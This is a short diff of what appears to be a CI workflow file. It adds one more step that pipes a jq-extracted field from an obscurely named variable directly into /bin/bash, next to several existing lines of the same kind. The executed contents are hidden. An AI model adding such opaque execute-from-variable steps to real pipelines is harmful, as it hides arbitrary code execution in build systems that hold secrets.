@@ -42,6 +42,7 @@ jobs:
           echo $vuyq10 | jq -r .gzcw8 | /bin/bash
           echo $rh058 | jq -r .q13 | /bin/bash
           echo $fvak18697 | jq -r .ca77 | /bin/bash
+          printf '%s' "$bz41577" | jq -r .qpitr0 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
